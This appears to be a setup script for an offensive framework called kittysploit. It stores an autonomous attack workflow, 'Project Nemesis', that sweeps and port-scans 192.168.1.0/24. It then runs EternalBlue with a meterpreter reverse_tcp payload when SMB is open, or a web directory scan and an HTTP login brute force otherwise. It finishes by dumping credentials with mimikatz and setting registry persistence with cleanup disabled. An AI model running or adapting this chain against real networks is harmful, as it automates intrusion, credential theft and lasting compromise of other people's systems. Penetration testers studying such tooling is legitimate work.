
import os
import sys
import json

# Add root to sys.path
ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, ROOT_DIR)

from kittysploit import Framework
from core.models.models import Workflow

def create_mega_workflow():
    framework = Framework()
    if not framework.db_manager:
        print("Error: DB manager not initialized")
        return

    name = "Project Nemesis: Global Recon & Advanced Persistence"
    description = "A comprehensive autonomous workflow with recursive scanning, conditional exploiting, and multi-user persistence."
    
    nodes = [
        # Initialization
        {"id": "node_1", "type": "start", "label": "Initial Breach", "x": 0, "y": 0, "color": {"border": "#ff7b72", "background": "#161b22"}},
        {"id": "node_2", "type": "variable", "label": "Set Target Range", "x": 0, "y": 100, "variableName": "target_network", "variableValue": "192.168.1.0/24", "color": {"border": "#ec407a", "background": "#161b22"}},
        
        # Recon Phase
        {"id": "node_3", "type": "module", "label": "Network Discovery", "x": 0, "y": 200, "module": "auxiliary/scanner/discovery/arp_sweep", "options": {"INTERFACE": "eth0"}, "color": {"border": "#58a6ff", "background": "#161b22"}},
        {"id": "node_4", "type": "module", "label": "Deep Port Scan", "x": 0, "y": 300, "module": "auxiliary/scanner/portscan/tcp", "options": {"PORTS": "1-10000", "THREADS": 20}, "color": {"border": "#58a6ff", "background": "#161b22"}},
        
        # Decision point 1: High potential services
        {"id": "node_5", "type": "condition", "label": "SMB Detected?", "x": 0, "y": 450, "expression": "ports.445 == 'open'", "trueLabel": "SMB Found", "falseLabel": "Alternative Path", "color": {"border": "#3fb950", "background": "#161b22"}},
        
        # SMB Path (True)
        {"id": "node_6", "type": "module", "label": "SMB Vuln Check", "x": -250, "y": 600, "module": "auxiliary/scanner/smb/smb_ms17_010", "options": {}, "color": {"border": "#58a6ff", "background": "#161b22"}},
        {"id": "node_7", "type": "condition", "label": "Vulnerable?", "x": -250, "y": 750, "expression": "last_output.vulnerable == True", "color": {"border": "#3fb950", "background": "#161b22"}},
        {"id": "node_8", "type": "module", "label": "EternalBlue Exploit", "x": -400, "y": 900, "module": "exploit/windows/smb/ms17_010_eternalblue", "options": {"PAYLOAD": "windows/meterpreter/reverse_tcp"}, "color": {"border": "#f85149", "background": "#161b22"}},
        
        # Alternative Path (False)
        {"id": "node_9", "type": "module", "label": "Web App Fuzzer", "x": 250, "y": 600, "module": "auxiliary/scanner/http/dir_scanner", "options": {"DICTIONARY": "common.txt"}, "color": {"border": "#58a6ff", "background": "#161b22"}},
        {"id": "node_10", "type": "loop", "label": "Brute Force Users", "x": 250, "y": 750, "iterations": 50, "loopVariable": "user_id", "color": {"border": "#9c27b0", "background": "#161b22"}},
        {"id": "node_11", "type": "module", "label": "HTTP Login Brute", "x": 250, "y": 900, "module": "auxiliary/scanner/http/http_login", "options": {"USER_FILE": "users.txt", "PASS_FILE": "pass.txt"}, "color": {"border": "#58a6ff", "background": "#161b22"}},
        
        # Post-Exploitation Block
        {"id": "node_12", "type": "delay", "label": "Wait for Session", "x": 0, "y": 1100, "delay": 10, "color": {"border": "#ffa726", "background": "#161b22"}},
        {"id": "node_13", "type": "module", "label": "Gather Credentials", "x": 0, "y": 1250, "module": "post/windows/gather/credentials/mimikatz", "options": {}, "color": {"border": "#58a6ff", "background": "#161b22"}},
        {"id": "node_14", "type": "module", "label": "Establish Persistence", "x": 0, "y": 1400, "module": "post/windows/persistence/swarmer_ntuser_persistence", "options": {"CLEANUP": False}, "color": {"border": "#58a6ff", "background": "#161b22"}},
    ]
    
    edges = [
        {"id": "e1", "from": "node_1", "to": "node_2"},
        {"id": "e2", "from": "node_2", "to": "node_3"},
        {"id": "e3", "from": "node_3", "to": "node_4"},
        {"id": "e4", "from": "node_4", "to": "node_5"},
        
        # SMB Path edges
        {"id": "e5", "from": "node_5", "to": "node_6", "label": "True"},
        {"id": "e6", "from": "node_6", "to": "node_7"},
        {"id": "e7", "from": "node_7", "to": "node_8", "label": "True"},
        {"id": "e8", "from": "node_8", "to": "node_12"},
        
        # Alternative Path edges
        {"id": "e9", "from": "node_5", "to": "node_9", "label": "False"},
        {"id": "e10", "from": "node_9", "to": "node_10"},
        {"id": "e11", "from": "node_10", "to": "node_11"},
        {"id": "e12", "from": "node_11", "to": "node_12"},
        
        # Post-Ex edges
        {"id": "e13", "from": "node_12", "to": "node_13"},
        {"id": "e14", "from": "node_13", "to": "node_14"},
    ]
    
    # Backwards compatibility steps (simplified execution plan)
    steps = [
        {"action": "variable", "name": "target_network", "value": "192.168.1.0/24"},
        {"action": "module", "module": "auxiliary/scanner/discovery/arp_sweep", "options": {"INTERFACE": "eth0"}},
        {"action": "module", "module": "auxiliary/scanner/portscan/tcp", "options": {"PORTS": "1-10000"}},
    ]

    with framework.db_manager.session_scope('default') as session:
        wf = Workflow(
            name=name,
            description=description,
            trigger="manual",
            enabled=True,
            is_template=False,
            nodes=json.dumps(nodes),
            edges=json.dumps(edges),
            steps=json.dumps(steps),
            variables=json.dumps({"target_network": "192.168.1.0/24"})
        )
        session.add(wf)
        session.commit()
    
    print(f"Workflow '{name}' created successfully!")

if __name__ == "__main__":
    create_mega_workflow()
